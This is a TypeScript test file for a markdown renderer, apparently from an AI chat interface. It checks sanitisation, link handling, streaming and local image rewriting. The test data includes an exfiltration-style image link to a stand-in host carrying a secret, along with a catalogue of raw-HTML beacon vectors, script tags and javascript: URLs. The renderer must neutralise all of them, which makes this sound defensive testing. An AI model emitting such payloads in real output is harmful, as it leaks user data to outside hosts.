import { describe, expect, it } from "vitest";
import { renderMarkdown, renderMarkdownTail } from "./markdown";
import { advance, createStreamingMarkdown } from "./streaming-markdown";

/** The single rendered `<img>` src, or null. */
function imageSrc(html: string): string | null {
  const doc = new DOMParser().parseFromString(html, "text/html");
  return doc.querySelector("img")?.getAttribute("src") ?? null;
}

describe("renderMarkdown", () => {
  it("renders GFM markdown (headings, emphasis)", () => {
    const html = renderMarkdown("# Title\n\nSome **bold** text.");
    expect(html).toContain("<h1");
    expect(html).toContain("Title");
    expect(html).toContain("<strong>bold</strong>");
  });

  it("highlights fenced code for a known language", () => {
    const html = renderMarkdown("```javascript\nconst x = 1;\n```");
    expect(html).toContain("language-javascript");
    expect(html).toContain("hljs-keyword"); // `const` got highlighted
  });

  it("resolves language aliases (js -> javascript)", () => {
    const html = renderMarkdown("```js\nconst x = 1;\n```");
    expect(html).toContain("hljs-keyword");
  });

  it("escapes code for an unknown language without throwing", () => {
    const html = renderMarkdown("```nope\n<b>x</b>\n```");
    expect(html).toContain("&lt;b&gt;");
  });

  describe("links open in a new tab", () => {
    function anchors(html: string): HTMLAnchorElement[] {
      const doc = new DOMParser().parseFromString(html, "text/html");
      return Array.from(doc.querySelectorAll("a"));
    }

    it.each([
      ["a markdown link", "See [the docs](https://example.com/docs)."],
      ["a GFM autolink", "Visit https://example.com today"],
      ["an angle-bracket autolink", "<https://example.com>"],
      ["a raw-HTML anchor", 'Raw <a href="https://example.com">link</a>'],
      ["a relative link", "[home](/settings)"],
    ])("%s gets target=_blank + rel=noopener noreferrer", (_label, src) => {
      const links = anchors(renderMarkdown(src));
      expect(links).toHaveLength(1);
      expect(links[0]?.getAttribute("target")).toBe("_blank");
      expect(links[0]?.getAttribute("rel")).toBe("noopener noreferrer");
    });

    it("overrides an author-supplied target/rel", () => {
      const [link] = anchors(
        renderMarkdown('<a href="https://example.com" target="_self" rel="opener">x</a>'),
      );
      expect(link?.getAttribute("target")).toBe("_blank");
      expect(link?.getAttribute("rel")).toBe("noopener noreferrer");
    });

    it("applies while streaming too", () => {
      const [link] = anchors(
        renderMarkdown("partial [link](https://example.com) **bo", { streaming: true }),
      );
      expect(link?.getAttribute("target")).toBe("_blank");
    });

    it("still strips javascript: hrefs", () => {
      const html = renderMarkdown('<a href="javascript:alert(1)">x</a>');
      expect(html).not.toContain("javascript:");
    });
  });

  it("sanitizes dangerous HTML", () => {
    const html = renderMarkdown("Hi <script>alert(1)</script> there");
    expect(html).not.toContain("<script>");
    expect(html).toContain("Hi");
  });

  it("balances dangling bold emphasis while streaming", () => {
    expect(renderMarkdown("a **bold", { streaming: true })).toContain("<strong>bold</strong>");
  });

  it("does not balance delimiters when not streaming", () => {
    expect(renderMarkdown("a **bold")).not.toContain("<strong>");
  });

  it("wraps fenced code blocks with a copy button", () => {
    const html = renderMarkdown("```js\nconst x = 1;\n```");
    expect(html).toContain("code-block");
    expect(html).toContain("data-copy");
    expect(html).toContain("<pre>");
  });

  it("does not add a copy button to inline code", () => {
    const html = renderMarkdown("use `npm run dev` please");
    expect(html).not.toContain("data-copy");
    expect(html).toContain("<code>npm run dev</code>");
  });

  it("returns an empty string for empty input", () => {
    expect(renderMarkdown("")).toBe("");
  });

  describe("remote images require consent", () => {
    const image = { apiBase: "http://localhost:24203", cwd: "/work" };

    it.each([
      "![secret](https://evil.example/pixel?d=secret)",
      "![secret](http://evil.example/pixel)",
      "![secret](//evil.example/pixel)",
      '<img src="https://evil.example/pixel" onerror="alert(1)">',
      '<img src="//evil.example/pixel">',
      '<img src="https:&#10;//evil.example/pixel">',
      '<img src="/\\evil.example/pixel">',
    ])("replaces %s with an inert, host-labelled button", (text) => {
      const doc = new DOMParser().parseFromString(renderMarkdown(text, { image }), "text/html");
      expect(doc.querySelector("img")).toBeNull();
      const button = doc.querySelector("button.remote-image");
      expect(button?.textContent).toBe("Load image from evil.example");
      expect(button?.getAttribute("type")).toBe("button");
      expect(button?.getAttribute("data-src")).toMatch(/^https?:\/\/evil\.example\//);
      expect(button?.hasAttribute("onerror")).toBe(false);
    });

    it.each([
      "/local-image?path=%2Ftmp%2Fa.png",
      "data:image/png;base64,iVBORw0KGgo=",
      `${window.location.origin}/image.png`,
      "http://localhost:24203/images/conversation/image.png",
    ])("keeps trusted image %s", (src) => {
      expect(imageSrc(renderMarkdown(`<img src="${src}">`, { image }))).toBe(src);
    });

    it("compares exact origins, not hostname prefixes or URL credentials", () => {
      for (const src of [
        "http://localhost:24203.evil.example/a.png",
        "http://localhost:24203@evil.example/a.png",
        "http://localhost:24206/a.png",
        "https://localhost:24203/a.png",
      ]) {
        expect(imageSrc(renderMarkdown(`<img src="${src}">`, { image }))).toBeNull();
      }
    });

    it("does not leak a backend allowlist between renders", () => {
      const text = "![pic](http://localhost:24203/a.png)";
      expect(imageSrc(renderMarkdown(text, { image }))).not.toBeNull();
      expect(imageSrc(renderMarkdown(text))).toBeNull();
    });

    it("removes responsive image sources so srcset cannot bypass consent", () => {
      const html = renderMarkdown(
        '<picture><source srcset="https://evil.example/a.png"><img src="/safe.png" srcset="https://evil.example/b.png 2x"></picture>',
      );
      expect(html).not.toContain("srcset");
      expect(html).not.toContain("evil.example");
    });

    it("blocks images in streaming tails and settled prefixes too", () => {
      const state = createStreamingMarkdown();
      const text = "![pic](https://evil.example/pixel)";
      expect(imageSrc(renderMarkdownTail(text))).toBeNull();
      expect(advance(state, text).tailHtml).toContain("remote-image");
      const settled = advance(state, `${text}\n\nafter\n`);
      expect(settled.prefixHtml).toContain("remote-image");
      expect(imageSrc(settled.prefixHtml)).toBeNull();
    });

    it("does not affect other DOMPurify consumers", async () => {
      const { default: purify } = await import("dompurify");
      expect(imageSrc(purify.sanitize('<img src="https://evil.example/a.png">'))).not.toBeNull();
    });
  });

  describe("raw HTML cannot load remote content outside image consent", () => {
    const remote = "https://evil.example/beacon";
    const vectors = [
      ["video poster", `<video poster="${remote}"></video>`, "video"],
      ["video src", `<video src="${remote}" autoplay></video>`, "video"],
      ["audio src", `<audio src="${remote}" preload="auto"></audio>`, "audio"],
      ["source src", `<video><source src="${remote}"></video>`, "source"],
      ["source srcset", `<picture><source srcset="${remote} 2x"></picture>`, "source"],
      ["track src", `<video><track src="${remote}" default></video>`, "track"],
      ["image input", `<input type="image" src="${remote}">`, "input"],
      ["input src without type", `<input src="${remote}">`, "input"],
      ["inline background", `<div style="background-image:url(${remote})">text</div>`, "[style]"],
      ["inline CSS escape", `<p style="background: u\\72l(${remote})">text</p>`, "[style]"],
      [
        "inline image-set",
        `<span style="background:image-set('${remote}' 1x)">text</span>`,
        "[style]",
      ],
      ["style import", `<style>@import '${remote}';</style>`, "style"],
      ["SVG image href", `<svg><image href="${remote}" /></svg>`, "svg,image"],
      ["SVG image xlink", `<svg><image xlink:href="${remote}" /></svg>`, "svg,image"],
      ["SVG use href", `<svg><use href="${remote}#x" /></svg>`, "svg,use"],
      ["SVG use xlink", `<svg><use xlink:href="${remote}#x" /></svg>`, "svg,use"],
      ["SVG filter", `<svg><filter><feImage href="${remote}" /></filter></svg>`, "svg,feImage"],
      ["MathML", `<math href="${remote}"><mi>x</mi></math>`, "math"],
      [
        "table background",
        `<table background="${remote}"><tr><td>x</td></tr></table>`,
        "[background]",
      ],
      [
        "td background",
        `<table><tr><td background="${remote}">x</td></tr></table>`,
        "[background]",
      ],
      ["body background", `<body background="${remote}">x</body>`, "[background]"],
      ["object data", `<object data="${remote}"></object>`, "object"],
      ["embed src", `<embed src="${remote}">`, "embed"],
      ["embed data", `<embed data="${remote}">`, "embed"],
      ["form action", `<form action="${remote}"><button>go</button></form>`, "form,[action]"],
      ["button formaction", `<button formaction="${remote}">go</button>`, "[formaction]"],
      ["input formaction", `<input type="submit" formaction="${remote}">`, "input,[formaction]"],
      ["stylesheet link", `<link rel="stylesheet" href="${remote}">`, "link"],
      ["preload link", `<link rel="preload" as="image" href="${remote}">`, "link"],
      ["prefetch link", `<link rel="prefetch" href="${remote}">`, "link"],
      ["DNS prefetch", `<link rel="dns-prefetch" href="//evil.example">`, "link"],
      ["meta refresh", `<meta http-equiv="refresh" content="0;url=${remote}">`, "meta"],
      ["iframe src", `<iframe src="${remote}"></iframe>`, "iframe"],
      [
        "iframe srcdoc",
        `<iframe srcdoc="&lt;img src='${remote}'&gt;"></iframe>`,
        "iframe,[srcdoc]",
      ],
      ["base URL", `<base href="${remote}/"><img src="/safe.png">`, "base"],
      ["script src", `<script src="${remote}"></script>`, "script"],
      ["anchor ping", `<a href="/safe" ping="${remote}">link</a>`, "[ping]"],
      ["legacy command", `<command icon="${remote}">`, "command"],
      ["legacy applet", `<applet codebase="${remote}" archive="x.jar"></applet>`, "applet"],
      ["non-image src", `<div src="${remote}" href="${remote}">text</div>`, "[src],[href]"],
    ] as const;

    // Inspect the returned DOM, not jsdom's lack of resource fetching. Both
    // authoritative renders and streaming tails must remove each active sink.
    describe.each([
      ["full", renderMarkdown],
      ["tail", renderMarkdownTail],
    ] as const)("%s render", (_name, render) => {
      it.each(vectors)("neutralizes %s", (_vector, text, forbidden) => {
        const doc = new DOMParser().parseFromString(render(text), "text/html");
        expect(doc.querySelector(forbidden)).toBeNull();
        for (const element of doc.body.querySelectorAll("*")) {
          for (const attr of element.attributes) {
            if (attr.name === "href" && element.tagName === "A") continue;
            expect(attr.value).not.toContain("evil.example");
          }
        }
      });
    });

    it("also blocks all vectors in settled streaming prefixes", () => {
      for (const [_name, text, forbidden] of vectors) {
        const state = createStreamingMarkdown();
        advance(state, `${text}\n\ntail`);
        const result = advance(state, `${text}\n\ntail grows`);
        const doc = new DOMParser().parseFromString(
          result.prefixHtml + result.tailHtml,
          "text/html",
        );
        expect(doc.querySelector(forbidden)).toBeNull();
      }
    });

    it("retains passive Markdown structure, highlighting and disabled task checkboxes", () => {
      const html = renderMarkdown(
        "- [x] done\n- [ ] pending\n\n| A | B |\n| - | - |\n| x | y |\n\n```js\nconst x = 1;\n```",
      );
      const doc = new DOMParser().parseFromString(html, "text/html");
      expect(doc.querySelectorAll('input[type="checkbox"][disabled]')).toHaveLength(2);
      expect(doc.querySelector("input[checked]")).not.toBeNull();
      expect(doc.querySelectorAll("td")).toHaveLength(2);
      expect(doc.querySelector(".hljs-keyword")).not.toBeNull();
      expect(doc.querySelector('button[data-copy][type="button"]')).not.toBeNull();
    });

    it("makes raw checkboxes and buttons inert, even inside an outer form", () => {
      const doc = new DOMParser().parseFromString(
        renderMarkdown('<input type="checkbox"><button type="submit">go</button>'),
        "text/html",
      );
      expect(doc.querySelector("input")?.hasAttribute("disabled")).toBe(true);
      expect(doc.querySelector("button")?.getAttribute("type")).toBe("button");
    });

    it("does not permit non-HTTP network schemes on images", () => {
      expect(imageSrc(renderMarkdown('<img src="ftp://evil.example/beacon">'))).toBeNull();
    });
  });

  describe("local-path images", () => {
    const BASE = "http://localhost:24203";
    const image = { apiBase: BASE, cwd: "/w/foo" };

    it("rewrites a file:// URL to the backend image route", () => {
      expect(imageSrc(renderMarkdown("![pic](file:///home/u/pic.png)", { image }))).toBe(
        `${BASE}/local-image?path=%2Fhome%2Fu%2Fpic.png`,
      );
    });

    it("rewrites an absolute path; an empty apiBase yields a root-relative src", () => {
      expect(imageSrc(renderMarkdown("![pic](/home/u/pic.png)", { image: { apiBase: "" } }))).toBe(
        "/local-image?path=%2Fhome%2Fu%2Fpic.png",
      );
      expect(imageSrc(renderMarkdown("![pic](/home/u/pic.png)", { image }))).toBe(
        `${BASE}/local-image?path=%2Fhome%2Fu%2Fpic.png`,
      );
    });

    it("resolves a relative path against the conversation cwd", () => {
      expect(imageSrc(renderMarkdown("![shot](shot.png)", { image }))).toBe(
        `${BASE}/local-image?path=%2Fw%2Ffoo%2Fshot.png`,
      );
      expect(
        imageSrc(renderMarkdown("![shot](shot.png)", { image: { apiBase: BASE, cwd: "/w/foo/" } })),
      ).toBe(`${BASE}/local-image?path=%2Fw%2Ffoo%2Fshot.png`);
    });

    it("leaves a relative path untouched when no cwd is available", () => {
      expect(imageSrc(renderMarkdown("![shot](shot.png)", { image: { apiBase: BASE } }))).toBe(
        "shot.png",
      );
      expect(imageSrc(renderMarkdown("![shot](shot.png)", { image }))).toBe(
        `${BASE}/local-image?path=%2Fw%2Ffoo%2Fshot.png`,
      );
      expect(imageSrc(renderMarkdown("![shot](shot.png)"))).toBe("shot.png");
    });

    it("leaves data: images untouched", () => {
      const data = "data:image/png;base64,iVBORw0KGgo=";
      expect(imageSrc(renderMarkdown(`![inline](${data})`, { image }))).toBe(data);
    });

    it("does not rewrite image syntax inside fenced code", () => {
      const html = renderMarkdown("```md\n![pic](/home/u/pic.png)\n```", { image });
      expect(html).toContain("/home/u/pic.png");
      expect(html).not.toContain("/local-image");
    });

    it("rewrites the streaming tail, the settled prefix, and a seeded tail", () => {
      const state = createStreamingMarkdown();
      const tail = advance(state, "![pic](/home/u/pic.png)", { image });
      expect(imageSrc(tail.tailHtml)).toBe(`${BASE}/local-image?path=%2Fhome%2Fu%2Fpic.png`);

      // The settled prefix must render with the same options too.
      const settled = advance(state, "![pic](/home/u/pic.png)\n\nnext\n", { image });
      expect(imageSrc(settled.prefixHtml)).toBe(`${BASE}/local-image?path=%2Fhome%2Fu%2Fpic.png`);

      const seeded = renderMarkdownTail(
        "![shot](shot.png)",
        { fences: 0, bold: 0, code: 0 },
        {
          image,
        },
      );
      expect(imageSrc(seeded)).toBe(`${BASE}/local-image?path=%2Fw%2Ffoo%2Fshot.png`);
    });

    it("invalidates the streaming cache when the image options change (async cwd)", () => {
      const state = createStreamingMarkdown();
      const text = "![shot](shot.png)\n\nnext\n";
      advance(state, text);
      expect(imageSrc(state.prefixHtml)).toBe("shot.png"); // no cwd yet
      const updated = advance(state, text, { image });
      expect(imageSrc(updated.prefixHtml)).toBe(`${BASE}/local-image?path=%2Fw%2Ffoo%2Fshot.png`);
    });
  });
});
